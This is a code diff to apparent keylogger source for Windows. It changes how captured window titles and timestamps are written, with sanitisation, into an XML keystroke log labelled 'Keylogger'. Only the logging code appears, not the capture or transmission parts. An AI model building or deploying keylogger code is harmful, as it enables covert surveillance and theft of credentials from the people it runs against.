@@ -45,7 +45,7 @@ FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
     current_process_data = writeUnsanitizedBuffer(current_process_data,"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA[");
     current_process_data = writeSanitizedBuffer(current_process_data,_GRAB_WINDOW_TITLE);
     current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></ProcessTitle>\n\t\t\t<TimeStamp>");
-    current_process_data = writeUnsanitizedBuffer(current_process_data,TimeStamp);
+    current_process_data = writeSanitizedBuffer(current_process_data,TimeStamp);
     current_process_data = writeUnsanitizedBuffer(current_process_data,
                                                   "</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[");
 
@@ -87,9 +87,9 @@ FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
   /*      cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE_SECONDARY<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<
         TimeStamp<<"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
   */      current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA[");
-        current_process_data = writeUnsanitizedBuffer(current_process_data,_GRAB_WINDOW_TITLE_SECONDARY);
+        current_process_data = writeSanitizedBuffer(current_process_data,_GRAB_WINDOW_TITLE_SECONDARY);
         current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></ProcessTitle>\n\t\t\t<TimeStamp>");
-        current_process_data = writeUnsanitizedBuffer(current_process_data,TimeStamp);
+        current_process_data = writeSanitizedBuffer(current_process_data,TimeStamp);
         current_process_data = writeUnsanitizedBuffer(current_process_data,"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[");
 
 
@@ -387,7 +387,7 @@ int main()
     /*
         display an xml header to generate the end document.
     */
-    // cout << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n";
+   // cout << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n";
     current_process_data = writeUnsanitizedBuffer(current_process_data,
     "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n");
     /*
